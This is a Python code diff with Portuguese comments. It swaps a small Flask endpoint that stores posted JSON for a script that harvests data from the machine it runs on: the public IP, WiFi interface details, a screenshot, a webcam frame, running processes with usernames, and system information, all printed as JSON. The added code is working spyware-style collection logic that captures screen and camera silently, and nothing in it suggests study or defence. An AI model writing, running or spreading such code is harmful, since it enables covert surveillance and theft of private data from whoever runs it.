@@ -2,24 +2,82 @@ import os
 import json
 import datetime
 import socket
-import sys
+import subprocess
+import base64
+import cv2
+import numpy as np
+import pyautogui
+import time
+import threading
+import io
+import platform
+import psutil
 
-# Corrige problema de compatibilidade
-sys.path.insert(0, '/opt/render/project/src/.venv/lib/python3.10/site-packages')
+def coletar_ip():
+    try:
+        # Obtém IP público
+        ip = subprocess.check_output("curl -s ifconfig.me").decode().strip()
+        return ip
+    except:
+        return None
 
-from flask import Flask, request, jsonify
+def coletar_wifi():
+    try:
+        # Captura informações do WiFi
+        result = subprocess.check_output("netsh wlan show interfaces").decode()
+        return result
+    except:
+        return None
 
-app = Flask(__name__)
-DATA_DIR = "./dados"
+def capturar_tela():
+    try:
+        # Captura tela
+        screenshot = pyautogui.screenshot()
+        img_byte_arr = io.BytesIO()
+        screenshot.save(img_byte_arr, format='PNG')
+        img_bytes = img_byte_arr.getvalue()
+        return base64.b64encode(img_bytes).decode('utf-8')
+    except:
+        return None
 
-@app.route('/receber', methods=['POST'])
-def receber():
-    data = request.get_json()
-    os.makedirs(DATA_DIR, exist_ok=True)
-    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-    with open(f"{DATA_DIR}/dados_{timestamp}.json", 'w') as f:
-        json.dump(data, f, indent=2)
-    return {"status": "sucesso"}, 200
+def capturar_camera():
+    try:
+        # Captura câmera
+        cap = cv2.VideoCapture(0)
+        ret, frame = cap.read()
+        cap.release()
+        if ret:
+            _, buffer = cv2.imencode('.jpg', frame)
+            img_bytes = buffer.tobytes()
+            return base64.b64encode(img_bytes).decode('utf-8')
+    except:
+        return None
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
+def coletar_processos():
+    try:
+        # Captura processos
+        processos = []
+        for proc in psutil.process_iter(['pid', 'name', 'username']):
+            processos.append(proc.info)
+        return processos
+    except:
+        return None
+
+def coletar_informacoes():
+    dados = {
+        "timestamp": datetime.datetime.now().isoformat(),
+        "ip": coletar_ip(),
+        "wifi": coletar_wifi(),
+        "tela": capturar_tela(),
+        "camera": capturar_camera(),
+        "processos": coletar_processos(),
+        "plataforma": platform.system(),
+        "versao": platform.version(),
+        "maquina": platform.machine(),
+        "processador": platform.processor()
+    }
+    return dados
+
+if __name__ == "__main__":
+    dados = coletar_informacoes()
+    print(json.dumps(dados, indent=2))
